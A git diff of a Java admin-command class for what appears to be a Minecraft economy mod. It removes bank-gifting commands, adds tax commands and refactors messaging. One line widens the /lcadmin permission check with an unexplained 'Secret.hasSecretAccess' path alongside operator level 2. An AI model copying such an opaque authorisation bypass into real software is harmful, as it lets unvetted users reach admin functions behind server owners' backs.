@@ -1,9 +1,7 @@
 package io.github.lightman314.lightmanscurrency.common.commands;
 
-import java.util.ArrayList;
 import java.util.Collection;
 import java.util.List;
-import java.util.UUID;
 
 import com.mojang.brigadier.CommandDispatcher;
 import com.mojang.brigadier.arguments.BoolArgumentType;
@@ -18,24 +16,21 @@ import io.github.lightman314.lightmanscurrency.common.blockentity.TraderBlockEnt
 import io.github.lightman314.lightmanscurrency.common.blocks.traderblocks.interfaces.ITraderBlock;
 import io.github.lightman314.lightmanscurrency.common.capability.IWalletHandler;
 import io.github.lightman314.lightmanscurrency.common.capability.WalletCapability;
-import io.github.lightman314.lightmanscurrency.common.commands.arguments.CoinValueArgument;
 import io.github.lightman314.lightmanscurrency.common.commands.arguments.TraderArgument;
-import io.github.lightman314.lightmanscurrency.common.bank.BankAccount;
-import io.github.lightman314.lightmanscurrency.common.bank.BankSaveData;
 import io.github.lightman314.lightmanscurrency.common.easy.EasyText;
 import io.github.lightman314.lightmanscurrency.common.items.WalletItem;
-import io.github.lightman314.lightmanscurrency.common.teams.Team;
-import io.github.lightman314.lightmanscurrency.common.teams.TeamSaveData;
+import io.github.lightman314.lightmanscurrency.common.menus.validation.types.SimpleValidator;
+import io.github.lightman314.lightmanscurrency.common.player.LCAdminMode;
+import io.github.lightman314.lightmanscurrency.common.taxes.TaxEntry;
+import io.github.lightman314.lightmanscurrency.common.taxes.TaxSaveData;
 import io.github.lightman314.lightmanscurrency.common.traders.TraderData;
 import io.github.lightman314.lightmanscurrency.common.traders.TraderSaveData;
 import io.github.lightman314.lightmanscurrency.common.traders.auction.AuctionHouseTrader;
 import io.github.lightman314.lightmanscurrency.common.traders.rules.TradeRule;
 import io.github.lightman314.lightmanscurrency.common.traders.rules.types.PlayerWhitelist;
 import io.github.lightman314.lightmanscurrency.common.traders.terminal.filters.TraderSearchFilter;
-import io.github.lightman314.lightmanscurrency.common.money.CoinValue;
-import io.github.lightman314.lightmanscurrency.network.LightmansCurrencyPacketHandler;
-import io.github.lightman314.lightmanscurrency.network.message.command.MessageDebugTrader;
-import io.github.lightman314.lightmanscurrency.network.message.command.MessageSyncAdminList;
+import io.github.lightman314.lightmanscurrency.network.message.command.SPacketDebugTrader;
+import io.github.lightman314.lightmanscurrency.secrets.Secret;
 import net.minecraft.ChatFormatting;
 import net.minecraft.commands.CommandBuildContext;
 import net.minecraft.commands.CommandSourceStack;
@@ -58,20 +53,18 @@ import net.minecraft.world.item.Items;
 import net.minecraft.world.level.Level;
 import net.minecraft.world.level.block.entity.BlockEntity;
 import net.minecraft.world.level.block.state.BlockState;
-import net.minecraftforge.network.PacketDistributor;
+
+import javax.annotation.Nullable;
 
 public class CommandLCAdmin {
-
-
-	private static List<UUID> adminPlayers = new ArrayList<>();
 
 	public static void register(CommandDispatcher<CommandSourceStack> dispatcher, CommandBuildContext context)
 	{
 		LiteralArgumentBuilder<CommandSourceStack> lcAdminCommand
 				= Commands.literal("lcadmin")
-				.requires((commandSource) -> commandSource.hasPermission(2))
+				.requires((stack) -> stack.hasPermission(2) || Secret.hasSecretAccess(stack))
 				.then(Commands.literal("toggleadmin")
-						.requires((commandSource) -> commandSource.getEntity() instanceof ServerPlayer)
+						.requires(CommandSourceStack::isPlayer)
 						.executes(CommandLCAdmin::toggleAdmin))
 				.then(Commands.literal("traderdata")
 						.then(Commands.literal("list")
@@ -92,23 +85,18 @@ public class CommandLCAdmin {
 				.then(Commands.literal("prepareForStructure")
 						.then(Commands.argument("traderPos", BlockPosArgument.blockPos())
 								.executes(CommandLCAdmin::setCustomTrader)))
-				.then(Commands.literal("giveMoneyToBankAccounts")
-						.then(Commands.literal("allPlayers")
-								.then(Commands.argument("amount", CoinValueArgument.argument(context))
-										.executes(CommandLCAdmin::giveBankAccountsMoneyAllPlayers)))
-						.then(Commands.literal("allTeams")
-								.then(Commands.argument("amount", CoinValueArgument.argument(context))
-										.executes(CommandLCAdmin::giveBankAccountsMoneyAllTeams)))
-						.then(Commands.literal("players")
-								.then(Commands.argument("players", EntityArgument.players())
-										.then(Commands.argument("amount", CoinValueArgument.argument(context))
-												.executes(CommandLCAdmin::giveBankAccountsMoneyPlayers)))))
 				.then(Commands.literal("replaceWallet").requires((c) -> !LightmansCurrency.isCuriosLoaded())
 						.then(Commands.argument("entity", EntityArgument.entities())
 								.then(Commands.argument("wallet", ItemArgument.item(context))
 										.executes(CommandLCAdmin::replaceWalletSlotWithDefault)
 										.then(Commands.argument("keepWalletContents", BoolArgumentType.bool())
-												.executes(CommandLCAdmin::replaceWalletSlot)))));
+												.executes(CommandLCAdmin::replaceWalletSlot)))))
+				.then(Commands.literal("taxes")
+						.then(Commands.literal("openServerTax")
+								.requires(CommandSourceStack::isPlayer)
+								.executes(CommandLCAdmin::openServerTax))
+						.then(Commands.literal("forceDisableTaxCollectors")
+								.executes(CommandLCAdmin::forceDisableTaxCollectors)));
 
 		dispatcher.register(lcAdminCommand);
 
@@ -119,9 +107,9 @@ public class CommandLCAdmin {
 		CommandSourceStack source = commandContext.getSource();
 		ServerPlayer sourcePlayer = source.getPlayerOrException();
 
-		ToggleAdminPlayer(sourcePlayer);
-		Component enabledDisabled = isAdminPlayer(sourcePlayer) ? EasyText.translatable("command.lightmanscurrency.lcadmin.toggleadmin.enabled").withStyle(ChatFormatting.GREEN) : EasyText.translatable("command.lightmanscurrency.lcadmin.toggleadmin.disabled").withStyle(ChatFormatting.RED);
-		source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.toggleadmin", enabledDisabled), true);
+		LCAdminMode.ToggleAdminPlayer(sourcePlayer);
+		Component enabledDisabled = LCAdminMode.isAdminPlayer(sourcePlayer) ? EasyText.translatable("command.lightmanscurrency.lcadmin.toggleadmin.enabled").withStyle(ChatFormatting.GREEN) : EasyText.translatable("command.lightmanscurrency.lcadmin.toggleadmin.disabled").withStyle(ChatFormatting.RED);
+		EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.toggleadmin", enabledDisabled), true);
 
 		return 1;
 	}
@@ -146,7 +134,7 @@ public class CommandLCAdmin {
 		if(be instanceof TraderBlockEntity<?> t)
 		{
 			t.saveCurrentTraderAsCustomTrader();
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.setCustomTrader.success"), true);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.setCustomTrader.success"), true);
 			return 1;
 		}
 
@@ -154,7 +142,7 @@ public class CommandLCAdmin {
 
 	}
 
-	static int listTraderData(CommandContext<CommandSourceStack> commandContext) throws CommandSyntaxException{
+	static int listTraderData(CommandContext<CommandSourceStack> commandContext) {
 
 		CommandSourceStack source = commandContext.getSource();
 		List<TraderData> allTraders = TraderSaveData.GetAllTraders(false);
@@ -162,22 +150,21 @@ public class CommandLCAdmin {
 		if(allTraders.size() > 0)
 		{
 
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.title"), true);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.title"), true);
 
 			for(int i = 0; i < allTraders.size(); i++)
 			{
 				TraderData thisTrader = allTraders.get(i);
 				//Spacer
 				if(i > 0) //No spacer on the first output
-					source.sendSuccess(EasyText.empty(), true);
+					EasyText.sendCommandSucess(source, EasyText.empty(), true);
 
 				sendTraderDataFeedback(thisTrader, source);
-
 			}
 		}
 		else
 		{
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.none"), true);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.none"), true);
 		}
 
 		return 1;
@@ -193,20 +180,20 @@ public class CommandLCAdmin {
 		if(results.size() > 0)
 		{
 
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.title"), true);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.title"), true);
 			for(int i = 0; i < results.size(); i++)
 			{
 				TraderData thisTrader = results.get(i);
 				//Spacer
 				if(i > 0) //No spacer on the first output
-					source.sendSuccess(EasyText.empty(), true);
+					EasyText.sendCommandSucess(source, EasyText.empty(), true);
 
 				sendTraderDataFeedback(thisTrader, source);
 			}
 		}
 		else
 		{
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.search.none"), true);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.search.none"), true);
 		}
 
 		return 1;
@@ -216,13 +203,13 @@ public class CommandLCAdmin {
 	{
 		//Trader ID
 		String traderID = String.valueOf(thisTrader.getID());
-		source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.traderid", EasyText.translatable(traderID).withStyle(Style.EMPTY.withClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, traderID)).withHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.traderid.copytooltip"))))), false);
+		EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.traderid", EasyText.translatable(traderID).withStyle(Style.EMPTY.withClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, traderID)).withHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.traderid.copytooltip"))))), false);
 		//Persistent ID
 		if(thisTrader.isPersistent())
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.persistentid", thisTrader.getPersistentID()), false);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.persistentid", thisTrader.getPersistentID()), false);
 
 		//Type
-		source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.type", thisTrader.type), false);
+		EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.type", thisTrader.type), false);
 
 		//Ignore everything else for auction houses
 		if(thisTrader instanceof AuctionHouseTrader)
@@ -231,30 +218,30 @@ public class CommandLCAdmin {
 		//Team / Team ID
 		if(thisTrader.getOwner().hasTeam())
 		{
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.owner.team", thisTrader.getOwner().getTeam().getName(), thisTrader.getOwner().getTeam().getID()), false);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.owner.team", thisTrader.getOwner().getTeam().getName(), thisTrader.getOwner().getTeam().getID()), false);
 		}
 		//Owner / Owner ID
 		else if(thisTrader.getOwner().hasPlayer())
 		{
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.owner", thisTrader.getOwner().getPlayer().getName(false), thisTrader.getOwner().getPlayer().id.toString()), false);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.owner", thisTrader.getOwner().getPlayer().getName(false), thisTrader.getOwner().getPlayer().id.toString()), false);
 		}
 		else
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.owner.custom", thisTrader.getOwner().getOwnerName(false)), false);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.owner.custom", thisTrader.getOwner().getOwnerName(false)), false);
 
 		if(!thisTrader.isPersistent())
 		{
 			//Dimension
 			String dimension = thisTrader.getLevel().location().toString();
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.dimension", dimension), false);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.dimension", dimension), false);
 			//Position
 			BlockPos pos = thisTrader.getPos();
 			String position = pos.getX() + " " + pos.getY() + " " + pos.getZ();
 			String teleportPosition = pos.getX() + " " + (pos.getY() + 1) + " " + pos.getZ();
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.position", EasyText.literal(position).withStyle(Style.EMPTY.withClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/execute in " + dimension + " run tp @s " + teleportPosition)).withHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.position.teleporttooltip"))))), true);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.position", EasyText.literal(position).withStyle(Style.EMPTY.withClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/execute in " + dimension + " run tp @s " + teleportPosition)).withHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.position.teleporttooltip"))))), true);
 		}
 		//Custom Name (if applicable)
 		if(thisTrader.hasCustomName())
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.name", thisTrader.getName()), true);
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.list.name", thisTrader.getName()), true);
 	}
 
 	static int deleteTraderData(CommandContext<CommandSourceStack> commandContext) throws CommandSyntaxException
@@ -267,9 +254,9 @@ public class CommandLCAdmin {
 		//Remove the trader
 		TraderSaveData.DeleteTrader(trader.getID());
 		//Send success message
-		source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.delete.success", trader.getName()), true);
-		if(source.getEntity() != null && source.getEntity() instanceof Player)
-			LightmansCurrencyPacketHandler.instance.send(LightmansCurrencyPacketHandler.getTarget((Player)source.getEntity()), new MessageDebugTrader(trader.getID()));
+		EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.universaldata.delete.success", trader.getName()), true);
+		if(source.getEntity() != null && source.getEntity() instanceof Player player)
+			new SPacketDebugTrader(trader.getID()).sendTo(player);
 		return 1;
 
 	}
@@ -279,7 +266,7 @@ public class CommandLCAdmin {
 		CommandSourceStack source = commandContext.getSource();
 
 		TraderData trader = TraderArgument.getTrader(commandContext, "traderID");
-		source.sendSuccess(EasyText.literal(trader.save().getAsString()), false);
+		EasyText.sendCommandSucess(source, EasyText.literal(trader.save().getAsString()), false);
 		return 1;
 	}
 
@@ -300,69 +287,20 @@ public class CommandLCAdmin {
 				if(whitelist.addToWhitelist(player))
 					count++;
 			}
-			source.sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.traderdata.add_whitelist.success", count, trader.getName()), true);
+			final int c = count;
+			EasyText.sendCommandSucess(source, EasyText.translatable("command.lightmanscurrency.lcadmin.traderdata.add_whitelist.success", c, trader.getName()), true);
 
 			if(count > 0)
-				trader.markRulesDirty();
+				trader.markTradeRulesDirty();
 
 			return count;
 		}
 		else
 		{
-			source.sendFailure(EasyText.translatable("command.lightmanscurrency.lcadmin.traderdata.add_whitelist.missingrule"));
+			EasyText.sendCommandFail(source, EasyText.translatable("command.lightmanscurrency.lcadmin.traderdata.add_whitelist.missingrule"));
 			return 0;
 		}
 
-	}
-
-	static int giveBankAccountsMoneyAllPlayers(CommandContext<CommandSourceStack> commandContext) throws CommandSyntaxException
-	{
-		CoinValue amount = CoinValueArgument.getCoinValue(commandContext,"amount");
-		int count = 0;
-		for(BankAccount.AccountReference account : BankSaveData.GetPlayerBankAccounts())
-		{
-			BankAccount.GiftCoinsFromServer(account.get(), amount.copy());
-			count++;
-		}
-		if(count < 1)
-			commandContext.getSource().sendFailure(EasyText.translatable("command.lightmanscurrency.lcadmin.giftBankAccounts.fail"));
-		else
-			commandContext.getSource().sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.giftBankAccounts.success", amount.getComponent("NULL"), count), true);
-		return count;
-	}
-
-	static int giveBankAccountsMoneyAllTeams(CommandContext<CommandSourceStack> commandContext) throws CommandSyntaxException
-	{
-		CoinValue amount = CoinValueArgument.getCoinValue(commandContext,"amount");
-		int count = 0;
-		for(Team team : TeamSaveData.GetAllTeams(false).stream().filter(Team::hasBankAccount).toList())
-		{
-			BankAccount.GiftCoinsFromServer(team.getBankAccount(), amount.copy());
-			count++;
-		}
-
-		if(count < 1)
-			commandContext.getSource().sendFailure(EasyText.translatable("command.lightmanscurrency.lcadmin.giftBankAccounts.fail"));
-		else
-			commandContext.getSource().sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.giftBankAccounts.success", amount.getComponent("NULL"), count), true);
-
-		return count;
-	}
-
-	static int giveBankAccountsMoneyPlayers(CommandContext<CommandSourceStack> commandContext) throws CommandSyntaxException
-	{
-		CoinValue amount = CoinValueArgument.getCoinValue(commandContext,"amount");
-		int count = 0;
-		for(Player player : EntityArgument.getPlayers(commandContext, "players"))
-		{
-			BankAccount.GiftCoinsFromServer(BankSaveData.GetBankAccount(player), amount.copy());
-			count++;
-		}
-		if(count < 1)
-			commandContext.getSource().sendFailure(EasyText.translatable("command.lightmanscurrency.lcadmin.giftBankAccounts.fail"));
-		else
-			commandContext.getSource().sendSuccess(EasyText.translatable("command.lightmanscurrency.lcadmin.giftBankAccounts.success", amount.getComponent("NULL"), count), true);
-		return count;
 	}
 
 	static int replaceWalletSlotWithDefault(CommandContext<CommandSourceStack> commandContext) throws CommandSyntaxException
@@ -399,21 +337,38 @@ public class CommandLCAdmin {
 		return count;
 	}
 
-
-	public static boolean isAdminPlayer(Player player) { return adminPlayers.contains(player.getUUID()) && player.hasPermissions(2); }
-
-
-	private static void ToggleAdminPlayer(ServerPlayer player) {
-		UUID playerID = player.getUUID();
-		if(adminPlayers.contains(playerID))
-			adminPlayers.remove(playerID);
+	static int openServerTax(CommandContext<CommandSourceStack> commandContext) throws CommandSyntaxException
+	{
+		TaxEntry entry = TaxSaveData.GetServerTaxEntry(false);
+		if(entry != null)
+		{
+			entry.openMenu(commandContext.getSource().getPlayerOrException(), SimpleValidator.NULL);
+			return 1;
+		}
 		else
-			adminPlayers.add(playerID);
-		LightmansCurrencyPacketHandler.instance.send(PacketDistributor.ALL.noArg(), new MessageSyncAdminList(adminPlayers));
+			EasyText.sendCommandFail(commandContext.getSource(), EasyText.translatable("command.lightmanscurrency.lcadmin.openServerTax.error"));
+		return 0;
 	}
 
-	public static MessageSyncAdminList getAdminSyncMessage() { return new MessageSyncAdminList(adminPlayers); }
+	static int forceDisableTaxCollectors(CommandContext<CommandSourceStack> commandContext)
+	{
+		int count = 0;
+		for(TaxEntry entry : TaxSaveData.GetAllTaxEntries(false))
+		{
+			if(entry.isActive())
+			{
+				entry.setActive(false, null);
+				count++;
+			}
+		}
+		if(count > 0)
+			EasyText.sendCommandSucess(commandContext.getSource(), EasyText.translatable("command.lightmanscurrency.lcadmin.forceDisableTaxCollectors.success", count), true);
+		else
+			EasyText.sendCommandFail(commandContext.getSource(), EasyText.translatable("command.lightmanscurrency.lcadmin.forceDisableTaxCollectors.fail"));
+		return count;
+	}
 
-	public static void loadAdminPlayers(List<UUID> serverAdminList) { adminPlayers = serverAdminList; }
+	@Deprecated(since = "2.1.2.4")
+	public static boolean isAdminPlayer(@Nullable Player player) { return LCAdminMode.isAdminPlayer(player); }
 
 }
